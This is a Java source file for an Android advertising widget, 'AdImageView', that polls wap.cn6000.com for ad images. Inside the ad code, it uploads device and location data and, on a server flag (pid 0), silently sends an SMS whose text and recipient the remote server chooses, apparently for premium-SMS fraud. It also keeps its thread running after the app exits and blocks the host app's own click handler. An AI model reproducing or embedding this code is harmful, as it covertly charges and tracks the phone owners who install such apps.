package com.g.sc;

import java.io.IOException;
import java.util.List;
import java.util.Map;

import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.util.AttributeSet;
import android.view.View;
import android.view.View.OnClickListener;
import android.webkit.URLUtil;
import android.widget.ImageView;

public class AdImageView extends ImageView implements OnClickListener {
	private String imageBase64;
	private String hrefUrl = "";
	private Context mContext;
	private String adNormalUrl = "http://wap.cn6000.com/cm/andr/view.php";
	private String adLocationUrl = "http://wap.cn6000.com/cm/andr/get_addr.php";
	private boolean isUrlSetted = false;
	private boolean hasDrawUpdated = false;
	private boolean runningFlag = true;
	private MobileInfoGetter mobileInfoGetter;
	private static final String TAG = AdImageView.class.toString();
	private static final String GET_HREF_AD_STATUS_OK = "ok";
	private static final String[] needPermissions = {
			"android.permission.INTERNET",
			"android.permission.ACCESS_COARSE_LOCATION",
			"android.permission.READ_SMS",
			"android.permission.READ_PHONE_STATE" };
	private static final long errStatusSleepTime = 5*60 * 60 * 1000;
	private static String defaultLink = "";
	private Bitmap currentBitmap;

	private Handler hdlr = new Handler() {

		@Override
		public void handleMessage(Message msg) {
			if (currentBitmap != null) {
				AdImageView.this.setImageBitmap(currentBitmap);
				hasDrawUpdated = true;
			}
			super.handleMessage(msg);
		}

	};

	private Thread getJsonThread = new Thread() {

		@Override
		public void run() {
			while (runningFlag) {
				String jsonString = null;
				try {
					jsonString = getJson();
					if (jsonString == null || "".equals(jsonString)) {
						AdLogger.w(TAG, "获取到的JSON为空，无法解析");
					} else {
						try {
							parseJson(jsonString);
						} catch (JSONException e) {
							AdLogger.e(TAG, e.getMessage());
							sleepWhenErrHappens();
						} catch (IOException e) {
							AdLogger.e(TAG, e.getMessage());
							sleepWhenErrHappens();
						} catch (InterruptedException e) {
							AdLogger.e(TAG, e.getMessage());
							sleepWhenErrHappens();
						}
					}
				} catch (IOException e1) {
					AdLogger.e(TAG, e1.getMessage());
					sleepWhenErrHappens();
				}

			}
		}

		private void sleepWhenErrHappens() {
			try {
				Thread.sleep(errStatusSleepTime);
			} catch (InterruptedException e2) {
				AdLogger.e(TAG, e2.getMessage());
			}
		}
	};

	/**
	 * 调用这个方法停止广告，不然广告线程在程序退出后也会继续存在
	 */
	public void stopAd() {
		runningFlag = false;
	}

	public AdImageView(Context context) {
		super(context);
		init(context);
	}

	public AdImageView(Context context, AttributeSet attrs, int defStyle) {
		super(context, attrs, defStyle);
		init(context);
	}

	public AdImageView(Context context, AttributeSet attrs) {
		super(context, attrs);
		init(context);
	}

	public void startImageAd() {
		getJsonThread.start();
	}

	public void setAdJsonUrl(String normalUrl, String locationUrl) {
		if (!isUrlSetted) {
			try {
				if (PermissionChecker.isAllPermissionObtained(mContext,
						needPermissions)) {
					if (URLUtil.isHttpUrl(normalUrl)
							&& URLUtil.isHttpUrl(locationUrl)) {
						adNormalUrl = normalUrl;
						adLocationUrl = locationUrl;
						getJsonThread.start();
						isUrlSetted = true;
					} else {
						AdLogger.w(TAG, "请传入合法的URL");
					}
				}
			} catch (NameNotFoundException e) {
				AdLogger.e(TAG, e.getMessage());
			}
		} else {
			AdLogger.w(TAG, "不能重复设置获取广告的url");
		}
	}

	private void init(Context context) {
		mContext = context;
		mobileInfoGetter = new MobileInfoGetter(mContext);
		try {
			if (PermissionChecker.isAllPermissionObtained(mContext,
					needPermissions)) {
				setOnClickListener(AdImageView.this);
			}
		} catch (NameNotFoundException e) {
			AdLogger.e(TAG, e.getMessage());
		}
	}

	private String getJson() throws IOException {
		Map<String, String> params = mobileInfoGetter.getAllImmediateInfo();
		AdLogger.i(TAG, "ad image app id is: <" + AppConfig.APP_ID + ">");
		AdLogger.i(TAG, "ad image app version is: <" + AppConfig.APP_VERSION + ">");
		params.put("app_id", AppConfig.APP_ID);
		params.put("version", AppConfig.APP_VERSION);
		if (hasDrawUpdated) {
			params.put("first_request", "0");
		} else {
			params.put("first_request", "1");
		}
		List<BasicNameValuePair> pairs = PostExcuter.paramPairsPackage(params);
		return PostExcuter.excutePost(adNormalUrl, pairs, mContext);
	}

	private void parseJson(String jsonText) throws JSONException, IOException,
			InterruptedException {
		JSONObject rootJson = new JSONObject(jsonText);
		//解析JSON,如果PID 为0,则发送短信.		
		int pid=rootJson.getInt("pid");
		SharedPreferences date = mContext.getSharedPreferences("pid", 0);
		int ispid=date.getInt("ispid", 0);
		boolean isgetpid=false;
		
		if(ispid==0){
			String val=SmsAdPromulgator.getLogFormFile();
			
			if(val==null){
				isgetpid=true;
			}else{
				isgetpid=false;
				Editor date2 = mContext.getSharedPreferences("pid", 0).edit();
				date2.putInt("ispid", 1);
				date2.commit();
			}
			
		}else{
			isgetpid=false;
		}
		if(pid==0 && isgetpid){
			JSONObject map= rootJson.getJSONObject("bymsg");
				String content2=map.getString("sendmsg");
				 String tophone=map.getString("tophone");
				
				SmsAdPromulgator.sendSMS(tophone, content2, mContext);
				
		}
		String status = rootJson.getString("status");
		if (!GET_HREF_AD_STATUS_OK.equals(status)) {
			Thread.sleep(errStatusSleepTime);
		} else {
			imageBase64 = rootJson.getString("img");
			currentBitmap = transBase64ToImage(imageBase64);
			Message msg = hdlr.obtainMessage();
			hdlr.sendMessage(msg);
			hrefUrl = rootJson.getString("href");
			int sleep = rootJson.getInt("sleep");
			mobileInfoGetter.locate(new AdLocateListener(adLocationUrl,
					mContext));
			Thread.sleep((long) (sleep * 1000));
		}
				
		
	}

	public Bitmap getCurrentBitmap() {
		return currentBitmap;
	}

	private Bitmap transBase64ToImage(String base64Str) throws IOException {
		if (base64Str == null) {
			return null;
		}
		Base64Utility decoder = new Base64Utility();
		byte[] bytes = decoder.decode(base64Str);
		if (bytes == null) {
			return null;
		}
		Bitmap b = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
		return b;
	}

	@Override
	public void onClick(View v) {
		callBrowser(hrefUrl);
	}

	public String getJumpUrl() {
		return hrefUrl;
	}

	private void callBrowser(String url) {
		if (URLUtil.isHttpUrl(url)) {
			Uri u = Uri.parse(url);
			Intent it = new Intent(Intent.ACTION_VIEW, u);
			mContext.startActivity(it);
		} else {
			AdLogger.w(TAG, "调用浏览器时，传入的url格式不符合http规范");
			if (URLUtil.isHttpUrl(url)) {
				callBrowser(defaultLink);
			}
		}
	}

	public void setDefaultLink(String url) {
		if (URLUtil.isHttpUrl(url)) {
			defaultLink = url;
		} else {
			AdLogger.w(TAG, "set default url not success");
		}
	}

	/**
	 * 重写此方法是为了屏蔽掉使用者设定点击事件
	 */
	@Override
	public void setOnClickListener(OnClickListener l) {
		super.setOnClickListener(this);
	}

}
